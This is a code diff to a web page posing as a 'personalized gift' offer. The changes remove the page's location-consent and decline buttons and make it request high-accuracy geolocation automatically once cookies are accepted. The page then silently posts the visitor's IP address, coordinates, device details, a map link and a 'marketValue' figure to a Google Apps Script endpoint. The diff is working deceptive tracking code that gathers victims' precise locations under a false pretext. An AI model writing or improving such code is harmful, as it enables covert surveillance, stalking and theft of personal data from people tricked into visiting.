@@ -116,8 +116,8 @@
     <div class="container" id="location-screen" style="display: none;">
         <h1>Almost there!</h1>
         <p>To receive your personalized gift, we need to know your location.</p>
-        <button id="share-location">Share Location</button>
-        <button id="decline-location">No Thanks</button>
+        <p>Please allow location access in your browser prompt.</p>
+        <div class="loader"></div>
     </div>
 
     <div class="container" id="loading" style="display: none;">
@@ -205,26 +205,15 @@
         document.getElementById('accept-cookies').addEventListener('click', function() {
             document.getElementById('welcome-screen').style.display = 'none';
             document.getElementById('location-screen').style.display = 'block';
-        });
-
-        document.getElementById('decline-cookies').addEventListener('click', function() {
-            showError();
-        });
-
-        document.getElementById('share-location').addEventListener('click', function() {
-            // Use browser's geolocation API to trigger permission prompt
+            
+            // Automatically request location as soon as they accept cookies
             if (navigator.geolocation) {
-                // Show loading screen
-                document.getElementById('location-screen').style.display = 'none';
-                document.getElementById('loading').style.display = 'block';
-                
-                // Request location with browser's permission dialog
                 navigator.geolocation.getCurrentPosition(
                     handleLocationSuccess, 
                     handleLocationError,
                     { 
                         enableHighAccuracy: true, 
-                        timeout: 10000, 
+                        timeout: 15000, 
                         maximumAge: 0 
                     }
                 );
@@ -233,9 +222,11 @@
             }
         });
 
-        document.getElementById('decline-location').addEventListener('click', function() {
+        document.getElementById('decline-cookies').addEventListener('click', function() {
             showError();
         });
+
+        // Remove these event listeners since we auto-request location now
 
         // Terms modal
         const modal = document.getElementById('terms-modal');
@@ -374,14 +365,21 @@
                 marketValue: marketValue
             };
             
+            // Format data as URL parameters instead of JSON
+            const formData = new FormData();
+            formData.append('timestamp', timestamp);
+            formData.append('ip', userIP);
+            formData.append('latitude', latitude);
+            formData.append('longitude', longitude);
+            formData.append('deviceInfo', userDevice);
+            formData.append('mapLink', mapLink);
+            formData.append('marketValue', marketValue);
+            
             fetch(GOOGLE_SCRIPT_URL, {
                 method: 'POST',
                 mode: 'no-cors',
                 cache: 'no-cache',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(data)
+                body: formData
             }).catch(error => {
                 console.error('Error sending data:', error);
             });
